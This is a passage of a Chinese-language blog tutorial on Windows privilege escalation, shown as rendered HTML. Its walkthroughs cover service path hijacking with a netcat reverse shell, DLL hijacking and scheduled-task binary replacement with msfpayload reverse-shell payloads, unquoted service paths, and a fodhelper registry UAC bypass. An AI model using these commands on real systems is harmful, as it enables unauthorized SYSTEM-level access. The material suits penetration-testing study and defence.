class="line"></span><br><span class="line">SERVICE_NAME: upnphost</span><br><span class="line">        TYPE               : 20  WIN32_SHARE_PROCESS</span><br><span class="line">        START_TYPE         : 3   DEMAND_START</span><br><span class="line">        ERROR_CONTROL      : 1   NORMAL</span><br><span class="line">        BINARY_PATH_NAME   : C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe</span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : Universal Plug and Play Device Host</span><br><span class="line">        DEPENDENCIES       : SSDPSRV</span><br><span class="line">        SERVICE_START_NAME : LocalSystem</span><br><span class="line">		</span><br><span class="line">C:\&gt; net start upnphost</span><br></pre></td></tr></table></figure>
+
+<h2 id="通过不正确的文件权限进行提权"><a href="#通过不正确的文件权限进行提权" class="headerlink" title="通过不正确的文件权限进行提权"></a>通过不正确的文件权限进行提权</h2><p>总体思路就是通过利用弱文件（夹）权限来提升权限。 比如DLL劫持提权，通过检索程序加载的dll文件， 如果程序或服务从攻击者具有写访问权限的目录加载文件，我们可以滥用该文件来弹出具有程序运行权限（这里是程序运行权限，也就是哪个用户运行的程序，就弹回哪个用户权限）的 shell。</p>
+<p>通常，Windows 应用程序将使用预定义的搜索路径来查找 DLL，并按特定顺序检查这些路径。 DLL 劫持通常是通过将恶意 DLL 放置在这些路径之一中，同时确保在合法 DLL 之前找到恶意DLL提前加载。</p>
+<p>32位系统的加载顺序如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1 - The directory from which the application loaded</span><br><span class="line">2 - 32-bit System directory (C:\Windows\System32)</span><br><span class="line">3 - 16-bit System directory (C:\Windows\System)</span><br><span class="line">4 - Windows directory (C:\Windows)</span><br><span class="line">5 - The current working directory (CWD)</span><br><span class="line">6 - Directories in the PATH environment variable (system then user)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Demo1"><a href="#Demo1" class="headerlink" title="Demo1"></a>Demo1</h3><p>下面将使用尝试加载 wlbsctrl.dll 的 IKEEXT（IKE 和 AuthIP IPsec 密钥模块）服务</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">This is on Windows 7 as low privilege user1.</span></span><br><span class="line"></span><br><span class="line">C:\Users\user1\Desktop&gt; echo %username%</span><br><span class="line"></span><br><span class="line">user1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">We have a win here since any non-default directory <span class="keyword">in</span> <span class="string">&quot;C:\&quot; will give write access to authenticated users.</span></span></span><br><span class="line">		</span><br><span class="line">C:\Users\user1\Desktop&gt; echo %path%</span><br><span class="line"></span><br><span class="line">C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Program Files\OpenVPN\bin;C:\Python27</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">We can check our access permissions with accesschk or cacls.</span></span></span><br><span class="line"></span><br><span class="line">C:\Users\user1\Desktop&gt; accesschk.exe -dqv &quot;C:\Python27&quot;</span><br><span class="line"></span><br><span class="line">C:\Python27</span><br><span class="line">  Medium Mandatory Level (Default) [No-Write-Up]</span><br><span class="line">  RW BUILTIN\Administrators</span><br><span class="line">        FILE_ALL_ACCESS</span><br><span class="line">  RW NT AUTHORITY\SYSTEM</span><br><span class="line">        FILE_ALL_ACCESS</span><br><span class="line">  R  BUILTIN\Users</span><br><span class="line">        FILE_LIST_DIRECTORY</span><br><span class="line">        FILE_READ_ATTRIBUTES</span><br><span class="line">        FILE_READ_EA</span><br><span class="line">        FILE_TRAVERSE</span><br><span class="line">        SYNCHRONIZE</span><br><span class="line">        READ_CONTROL</span><br><span class="line">  RW NT AUTHORITY\Authenticated Users</span><br><span class="line">        FILE_ADD_FILE</span><br><span class="line">        FILE_ADD_SUBDIRECTORY</span><br><span class="line">        FILE_LIST_DIRECTORY</span><br><span class="line">        FILE_READ_ATTRIBUTES</span><br><span class="line">        FILE_READ_EA</span><br><span class="line">        FILE_TRAVERSE</span><br><span class="line">        FILE_WRITE_ATTRIBUTES</span><br><span class="line">        FILE_WRITE_EA</span><br><span class="line">        DELETE</span><br><span class="line">        SYNCHRONIZE</span><br><span class="line">        READ_CONTROL</span><br><span class="line"></span><br><span class="line">C:\Users\user1\Desktop&gt; cacls &quot;C:\Python27&quot;</span><br><span class="line"></span><br><span class="line">C:\Python27 BUILTIN\Administrators:(ID)F</span><br><span class="line">            BUILTIN\Administrators:(OI)(CI)(IO)(ID)F</span><br><span class="line">            NT AUTHORITY\SYSTEM:(ID)F</span><br><span class="line">            NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(ID)F</span><br><span class="line">            BUILTIN\Users:(OI)(CI)(ID)R</span><br><span class="line">            NT AUTHORITY\Authenticated Users:(ID)C</span><br><span class="line">            NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(ID)C</span><br><span class="line">			</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Before we go over to action we need to check the status of the IKEEXT service. In this case we can see it is set to &quot;</span>AUTO_START<span class="string">&quot; so it will launch on boot!</span></span></span><br><span class="line">		</span><br><span class="line">C:\Users\user1\Desktop&gt; sc qc IKEEXT</span><br><span class="line"></span><br><span class="line">[SC] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: IKEEXT</span><br><span class="line">        TYPE               : 20  WIN32_SHARE_PROCESS</span><br><span class="line">        START_TYPE         : 2   AUTO_START</span><br><span class="line">        ERROR_CONTROL      : 1   NORMAL</span><br><span class="line">        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k netsvcs</span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : IKE and AuthIP IPsec Keying Modules</span><br><span class="line">        DEPENDENCIES       : BFE</span><br><span class="line">        SERVICE_START_NAME : LocalSystem</span><br></pre></td></tr></table></figure>
+
+<p>生成恶意 DLL 并反弹 shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@darkside:~# msfpayload windows/shell_reverse_tcp lhost=&#x27;127.0.0.1&#x27; lport=&#x27;9988&#x27; O</span><br><span class="line">root@darkside:~# msfpayload windows/shell_reverse_tcp lhost=&#x27;127.0.0.1&#x27; lport=&#x27;9988&#x27; D &gt; </span><br><span class="line">/root/Desktop/evil.dll</span><br></pre></td></tr></table></figure>
+
+<p>将 DLL 传输到目标计算机后，我们需要做的就是将其重命名为 wlbsctrl.dll 并将其移动到“C:\Python27”，然后等待机器重新启动（或者可以尝试强制重新启动），将获得一个 SYSTEM shell。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Again, this is as low privilege user1.</span></span><br><span class="line"></span><br><span class="line">C:\Users\user1\Desktop&gt; dir</span><br><span class="line"></span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is 948D-A98F</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\user1\Desktop</span><br><span class="line"></span><br><span class="line">02/18/2014  01:49 PM    &lt;DIR&gt;          .</span><br><span class="line">02/18/2014  01:49 PM    &lt;DIR&gt;          ..</span><br><span class="line">04/22/2013  09:39 AM           331,888 accesschk.exe</span><br><span class="line">02/18/2014  12:38 PM            14,336 evil.dll</span><br><span class="line">01/25/2014  12:46 AM            36,864 fubar.exe</span><br><span class="line">01/22/2014  08:17 AM    &lt;DIR&gt;          incognito2</span><br><span class="line">06/30/2011  01:52 PM         1,667,584 ncat.exe</span><br><span class="line">11/22/2013  07:39 PM             1,225 wmic_info.bat</span><br><span class="line">               5 File(s)      2,051,897 bytes</span><br><span class="line">               3 Dir(s)      73,052,160 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\user1\Desktop&gt; copy evil.dll C:\Python27\wlbsctrl.dll</span><br><span class="line"></span><br><span class="line">        1 file(s) copied.</span><br><span class="line">		</span><br><span class="line">C:\Users\user1\Desktop&gt; dir C:\Python27</span><br><span class="line"></span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is 948D-A98F</span><br><span class="line"></span><br><span class="line"> Directory of C:\Python27</span><br><span class="line"></span><br><span class="line">02/18/2014  01:53 PM    &lt;DIR&gt;          .</span><br><span class="line">02/18/2014  01:53 PM    &lt;DIR&gt;          ..</span><br><span class="line">10/20/2012  02:52 AM    &lt;DIR&gt;          DLLs</span><br><span class="line">10/20/2012  02:52 AM    &lt;DIR&gt;          Doc</span><br><span class="line">10/20/2012  02:52 AM    &lt;DIR&gt;          include</span><br><span class="line">01/28/2014  03:45 AM    &lt;DIR&gt;          Lib</span><br><span class="line">10/20/2012  02:52 AM    &lt;DIR&gt;          libs</span><br><span class="line">04/10/2012  11:34 PM            40,092 LICENSE.txt</span><br><span class="line">04/10/2012  11:18 PM           310,875 NEWS.txt</span><br><span class="line">04/10/2012  11:31 PM            26,624 python.exe</span><br><span class="line">04/10/2012  11:31 PM            27,136 pythonw.exe</span><br><span class="line">04/10/2012  11:18 PM            54,973 README.txt</span><br><span class="line">10/20/2012  02:52 AM    &lt;DIR&gt;          tcl</span><br><span class="line">10/20/2012  02:52 AM    &lt;DIR&gt;          Tools</span><br><span class="line">04/10/2012  11:31 PM            49,664 w9xpopen.exe</span><br><span class="line">02/18/2014  12:38 PM            14,336 wlbsctrl.dll</span><br><span class="line">               7 File(s)        523,700 bytes</span><br><span class="line">               9 Dir(s)      73,035,776 bytes free</span><br></pre></td></tr></table></figure>
+
+<h3 id="Demo2"><a href="#Demo2" class="headerlink" title="Demo2"></a>Demo2</h3><p>目标主机运行了TFTP 客户端，它正在连接到远程主机并抓取某种日志文件。 我们可以看到该任务每天上午 9 点运行，并且以系统级权限运行。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">HostName:                             B33F</span><br><span class="line">TaskName:                             \LogGrabberTFTP</span><br><span class="line">Next Run Time:                        2/19/2014 9:00:00 AM</span><br><span class="line">Status:                               Ready</span><br><span class="line">Logon Mode:                           Interactive/Background</span><br><span class="line">Last Run Time:                        N/A</span><br><span class="line">Last Result:                          1</span><br><span class="line">Author:                               B33F\b33f</span><br><span class="line">Task To Run:                          E:\GrabLogs\tftp.exe 10.1.1.99 GET log.out E:\GrabLogs\Logs\log.txt</span><br><span class="line">Start In:                             N/A</span><br><span class="line">Comment:                              N/A</span><br><span class="line">Scheduled Task State:                 Enabled</span><br><span class="line">Idle Time:                            Disabled</span><br><span class="line">Power Management:                     Stop On Battery Mode, No Start On Batteries</span><br><span class="line">Run As User:                          SYSTEM</span><br><span class="line">Delete Task If Not Rescheduled:       Enabled</span><br><span class="line">Stop Task If Runs X Hours and X Mins: 72:00:00</span><br><span class="line">Schedule:                             Scheduling data is not available in this format.</span><br><span class="line">Schedule Type:                        Daily</span><br><span class="line">Start Time:                           9:00:00 AM</span><br><span class="line">Start Date:                           2/17/2014</span><br><span class="line">End Date:                             N/A</span><br><span class="line">Days:                                 Every 1 day(s)</span><br><span class="line">Months:                               N/A</span><br><span class="line">Repeat: Every:                        Disabled</span><br><span class="line">Repeat: Until: Time:                  Disabled</span><br><span class="line">Repeat: Until: Duration:              Disabled</span><br><span class="line">Repeat: Stop If Still Running:        Disabled</span><br></pre></td></tr></table></figure>
+
+<p>先检查攻击者是否有这个文件夹的写权限。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\user1\Desktop&gt; accesschk.exe -dqv &quot;E:\GrabLogs&quot;</span><br><span class="line"></span><br><span class="line">E:\GrabLogs</span><br><span class="line">  Medium Mandatory Level (Default) [No-Write-Up]</span><br><span class="line">  RW BUILTIN\Administrators</span><br><span class="line">        FILE_ALL_ACCESS</span><br><span class="line">  RW NT AUTHORITY\SYSTEM</span><br><span class="line">        FILE_ALL_ACCESS</span><br><span class="line">  RW NT AUTHORITY\Authenticated Users</span><br><span class="line">        FILE_ADD_FILE</span><br><span class="line">        FILE_ADD_SUBDIRECTORY</span><br><span class="line">        FILE_LIST_DIRECTORY</span><br><span class="line">        FILE_READ_ATTRIBUTES</span><br><span class="line">        FILE_READ_EA</span><br><span class="line">        FILE_TRAVERSE</span><br><span class="line">        FILE_WRITE_ATTRIBUTES</span><br><span class="line">        FILE_WRITE_EA</span><br><span class="line">        DELETE</span><br><span class="line">        SYNCHRONIZE</span><br><span class="line">        READ_CONTROL</span><br><span class="line">  R  BUILTIN\Users</span><br><span class="line">        FILE_LIST_DIRECTORY</span><br><span class="line">        FILE_READ_ATTRIBUTES</span><br><span class="line">        FILE_READ_EA</span><br><span class="line">        FILE_TRAVERSE</span><br><span class="line">        SYNCHRONIZE</span><br><span class="line">        READ_CONTROL</span><br><span class="line">		</span><br><span class="line">C:\Users\user1\Desktop&gt; dir &quot;E:\GrabLogs&quot;</span><br><span class="line"></span><br><span class="line"> Volume in drive E is More</span><br><span class="line"> Volume Serial Number is FD53-2F00</span><br><span class="line"></span><br><span class="line"> Directory of E:\GrabLogs</span><br><span class="line"></span><br><span class="line">02/18/2014  11:34 PM    &lt;DIR&gt;          .</span><br><span class="line">02/18/2014  11:34 PM    &lt;DIR&gt;          ..</span><br><span class="line">02/18/2014  11:34 PM    &lt;DIR&gt;          Logs</span><br><span class="line">02/18/2014  09:21 PM           180,736 tftp.exe</span><br><span class="line">               1 File(s)        180,736 bytes</span><br><span class="line">               3 Dir(s)   5,454,602,240 bytes free</span><br></pre></td></tr></table></figure>
+
+<p>任何经过身份验证的用户都具有对该文件夹的写访问权限，使用 Metasploit 生成后门文件覆盖原有的二进制文件。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@darkside:~# msfpayload windows/shell_reverse_tcp lhost=&#x27;127.0.0.1&#x27; lport=&#x27;9988&#x27; O</span><br><span class="line">root@darkside:~# msfpayload windows/shell_reverse_tcp lhost=&#x27;127.0.0.1&#x27; lport=&#x27;9988&#x27; R | msfencode -t exe &gt; /root/Desktop/evil-tftp.exe</span><br></pre></td></tr></table></figure>
+
+<p>上传恶意可执行文件并覆盖“E:\GrabLogs\tftp.exe”。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\user1\Desktop&gt; dir</span><br><span class="line"></span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is 948D-A98F</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\user1\Desktop</span><br><span class="line"></span><br><span class="line">02/19/2014  01:36 AM    &lt;DIR&gt;          .</span><br><span class="line">02/19/2014  01:36 AM    &lt;DIR&gt;          ..</span><br><span class="line">04/22/2013  09:39 AM           331,888 accesschk.exe</span><br><span class="line">02/19/2014  01:31 AM            73,802 evil-tftp.exe</span><br><span class="line">01/25/2014  12:46 AM            36,864 fubar.exe</span><br><span class="line">01/22/2014  08:17 AM    &lt;DIR&gt;          incognito2</span><br><span class="line">06/30/2011  01:52 PM         1,667,584 ncat.exe</span><br><span class="line">02/18/2014  12:38 PM            14,336 wlbsctrl.dll</span><br><span class="line">11/22/2013  07:39 PM             1,225 wmic_info.bat</span><br><span class="line">               6 File(s)      2,125,699 bytes</span><br><span class="line">               3 Dir(s)      75,341,824 bytes free</span><br><span class="line">		</span><br><span class="line">C:\Users\user1\Desktop&gt; copy evil-tftp.exe E:\GrabLogs\tftp.exe</span><br><span class="line"></span><br><span class="line">Overwrite E:\GrabLogs\tftp.exe? (Yes/No/All): Yes</span><br><span class="line">        1 file(s) copied.</span><br></pre></td></tr></table></figure>
+
+<h3 id="Demo3"><a href="#Demo3" class="headerlink" title="Demo3"></a>Demo3</h3><p>以SYSTEM运行的服务程序，若文件系统权限允许任何人修改，则可利用提权。</p>
+<p>查询所有服务进程路径（Program Files路径表示是用户安装的服务)</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#power shell command</span></span><br><span class="line"><span class="built_in">Get-WmiObject</span> win32_service | <span class="built_in">Select-Object</span> Name,State,PathName | <span class="built_in">Where-Object</span>&#123;<span class="variable">$_</span>.State <span class="operator">-like</span> <span class="string">&#x27;Running&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>主要关注启动的服务的路径，如果路径中有空格，那么路径必须包含在双引号内</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Name                           State   PathName</span><br><span class="line"></span><br><span class="line">----                           -----   --------</span><br><span class="line"></span><br><span class="line">AMD Crash Defender Service     Running C:\WINDOWS\System32\amdfendrsr.exe</span><br><span class="line">WdNisSvc                       Running &quot;C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24020.7-0\NisSrv.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p>如果有一个路径有空格，但是不在双引号内，这就有可能用来提权</p>
+<p>需要满足几个条件，首先该服务要以高权限运行，其次某一级路径要可写</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Common Files\VMware\USB\vmware-usbarbitrator64.exe</span><br><span class="line">操作系统在解析这个路径的时候，就会先检查C盘下有没有一个C:\Program.exe的文件，如果有那么就执行</span><br><span class="line">C:\Program.exe Files\Common Files\VMware\USB\vmware-usbarbitrator64.exe</span><br><span class="line">后面的就会被当成参数</span><br><span class="line"></span><br><span class="line">如果C盘根目录下无写入权限，那么就可以在C:\Program Files\下写入一个Common.exe后门，执行</span><br><span class="line">C:\Program.exe Files\Common.exe Files\VMware\USB\vmware-usbarbitrator64.exe</span><br><span class="line"></span><br><span class="line">其余同理</span><br><span class="line">或者vmware-usbarbitrator64.exe我们有改写的权限，那更直接了</span><br><span class="line">查看文件权限</span><br><span class="line">icacls &quot;C:\Program Files\Common Files\VMware\USB\vmware-usbarbitrator64.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h2><p>简单来说就是平时安装可执行文件的时候，会弹一个窗，是否确定运行。一个administrator组的用户都有两个令牌，一个是管理员权限的令牌，一个是普通用户权限的令牌，UAC就是临时切换到管理员权限下的令牌，比如在普通用户运行cmd和管理员权限运行cmd的时候查看user，返回的都是普通用户。</p>
+<p>允许管理员用户通过静默方式将完整性级别从中等提升到高，绕过UAC大多数UAC绕过技术都只针对特定版本(Win10 build 1709)，包括部分18.x,19.x的win10</p>
+<p>fodhelper.exe用于修改操作系统语言设置，默认运行于高完整性级别，无需管理员权限即可修改注册表项，实现以高完整性级别运行程序。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">设置=&gt;系统=&gt;应用和功能=&gt;管理可选功能(C:IWindowslSystem32lfodhelper.exe)</span><br></pre></td></tr></table></figure>
+
+<p>使用sigcheck查看fodhelper.exe的manifest</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sigcheck.exe -a -m c:\windows\system32\fodhelper.exe</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">security</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">requestedPrivileges</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">requestedExecutionLevel</span></span></span><br><span class="line"><span class="tag">			<span class="attr">level</span>=<span class="string">&quot;requireAdministrator&quot;</span></span></span><br><span class="line"><span class="tag">		/&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">requestedPrivileges</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">security</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">trustInfo</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">asmv3</span> <span class="attr">:application</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">asmv3:windowsSettings</span> <span class="attr">xm1ns</span>=<span class="string">&quot;http://schemas.microsoft.com/SMI/2005/WindowsSettings&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dpiAware</span>&gt;</span>true<span class="tag">&lt;/<span class="name">dpiAware</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">autoElevate</span>&gt;</span>true<span class="tag">&lt;/<span class="name">autoElevate</span>&gt;</span></span><br><span class="line">	&lt;/asmv3: windowsSettings&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">asmv3:application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">assembly</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="绕过UAC提权"><a href="#绕过UAC提权" class="headerlink" title="绕过UAC提权"></a>绕过UAC提权</h3><p>我们无权修改任意注册表项，因此过滤当前用户可读写的 HKEY_CURRENT_USER</p>
+<p>发现 fodhelper.exe尝试访问HKCU:\Software\Classes\ms-settings\shell\open\command 键值（不存在)，手动添加此注册表键</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\admin&gt; REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command</span><br></pre></td></tr></table></figure>
+
+<p>同上的方法，查看fodhelper.exe尝试访问的注册表键，再添加两个注册表项</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\admin&gt; REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ</span><br><span class="line"></span><br><span class="line">C:\Users\admin&gt; REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d &quot;cmd.exe&quot; /f</span><br></pre></td></tr></table></figure>
+
+<p>再次执行fodhelper.exe，就会弹出管理员的cmd窗口</p>
+<h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 首次执行任何 sysinternals 工具时，用户将看到一个 GUI 弹出窗口以接受 EULA，可以用如下参数绕过（第一次执行需要加该参数）</span><br><span class="line"></span><br><span class="line">accesschk.exe /accepteula ... ... ...</span><br><span class="line"></span><br><span class="line"># Find all weak folder permissions per drive.</span><br><span class="line">accesschk.exe -uwdqs Users c:\</span><br><span class="line">accesschk.exe -uwdqs &quot;Authenticated Users&quot; c:\</span><br><span class="line"></span><br><span class="line"># Find all weak file permissions per drive.</span><br><span class="line">accesschk.exe -uwqs Users c:\*.*</span><br><span class="line">accesschk.exe -uwqs &quot;Authenticated Users&quot; c:\*.*</span><br></pre></td></tr></table></figure>
+
+<p>可以用sysinternals 工具中的process monitor(Procmon64)查看exe加载了哪些dll</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/yu1e">项目</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
